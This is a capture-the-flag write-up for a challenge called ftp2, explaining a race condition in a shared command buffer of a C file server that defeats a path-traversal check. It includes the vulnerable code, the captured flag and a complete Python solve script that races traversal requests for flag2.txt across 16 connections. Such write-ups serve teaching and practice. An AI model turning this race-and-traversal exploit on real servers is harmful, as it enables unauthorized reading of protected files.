# pwn/ftp2

Part 2 of the `ftp` challenge requires the user to bypass the `valid_file` check to read the second flag.

When reading in the command, the connection thread uses a globally defined buffer `req_buf` to hold the command. The argument to each handler is an offset into this buffer.

```c
char req_buf[REQ_BUF_LEN];

cmd_type_t get_type_and_arg(char *buf, char **arg) {
  cmd_type_t type = CMD_UNKNOWN;
  if (!strncmp(buf, "GET ", strlen("GET "))) {
    *arg = &buf[4];
    type = CMD_GET;
  } else if (!strncmp(buf, "LIST ", strlen("LIST "))) {
    *arg = &buf[5];
    type = CMD_LIST;
  } else if (!strncmp(buf, "AUTH ", strlen("AUTH "))) {
    *arg = &buf[5];
    type = CMD_AUTH;
  } else if (!strncmp(buf, "EXIT", strlen("EXIT"))) {
    type = CMD_EXIT;
  }
  return type;
}


void *handle_connection(void *thread_arg) {
  // ...
  while (1) {
    send_str(arg->client_fd, "> ");
    ssize_t n = readline(arg->client_fd, req_buf, REQ_BUF_LEN);
    // ...
    cmd_type_t type = get_type_and_arg(req_buf, &cmd_arg);
    // ...
  }

```

`flag2.txt` sits in `/` which is not reachable through the `GET` command.

When GETting a file, `valid_file` is used to ensure we can't use path traversal characters to break out of the `storage` directory.

```c

int valid_file(char *fname) {
  if (strstr(fname, "..") || fname[0] == '/') {
    return 0;
  }
  return 1;
}

void handle_get(int fd, char *fname) {
  char path[0x100] = {};
  struct stat st = {};
  if (!valid_file(fname)) {
    goto err;
    return;
  }

  DBG("Reading file %s", fname);

  snprintf(path, sizeof(path), "storage/%s", fname);

  int file_fd = open(path, O_RDONLY);
  // ...
  sendfile(fd, file_fd, NULL, st.st_size);

  return;
err:
  send_str(fd, "INVALID FILE");
  return;
}
```

Since `fname` is an offset into `req_buf` which is shared across threads, this introduces a TOCTOU race condition bug. If another thread connects and fills `req_buf` with data AFTER `valid_file` has passed, it could inject path traversal characters into the `fname` and potentially break out of `storage`.

So by spamming `GET ../../../../../flag2.txt` and `GET <legitimate file>` at the same time, we can enter a scenario where the validity check happens on `<legitimate file>`, but the final open/sendfile is on the path traversal to `flag2.txt`.

The final solve script spins up 16 connections at once to improve the chance of winning the race:

```bash
$ python3 x2.py
EMU{speediest_racer_in_the_world}
```

```py
from pwn import *
import threading


HOST = "ftp-cf2e1679da19.inst.ctf.emu.team"
PORT = 1337
CONNECTIONS = 16

SAFE_GET = b"GET 0days_ru.txt"
FLAG_GET = b"GET ../../../../../../flag2.txt"

context.log_level = "error"


def conn():
    p = remote(HOST, PORT, ssl=True)
    p.recvuntil(b"> ")
    p.sendline(b"AUTH abz")
    p.recvuntil(b"> ")
    return p


def request(index, p, cmd, barrier, results):
    try:
        barrier.wait()
        p.sendline(cmd)
        response = p.recvuntil(b"> ", timeout=2)
        results[index] = response if response.endswith(b"> ") else None
    except (EOFError, PwnlibException):
        results[index] = None


def main():
    connections = [conn() for _ in range(CONNECTIONS)]

    try:
        while True:
            results = [None] * CONNECTIONS
            barrier = threading.Barrier(CONNECTIONS + 1)
            threads = []

            for index, p in enumerate(connections):
                cmd = SAFE_GET if index % 2 == 0 else FLAG_GET
                thread = threading.Thread(
                    target=request,
                    args=(index, p, cmd, barrier, results),
                )
                thread.start()
                threads.append(thread)

            barrier.wait()
            for thread in threads:
                thread.join()

            for response in results:
                if response is not None and b"EMU{" in response:
                    print(response.removesuffix(b"> ").decode(errors="replace"))
                    return

            for index, response in enumerate(results):
                if response is None:
                    connections[index].close()
                    connections[index] = conn()
    finally:
        for p in connections:
            p.close()


if __name__ == "__main__":
    main()
```
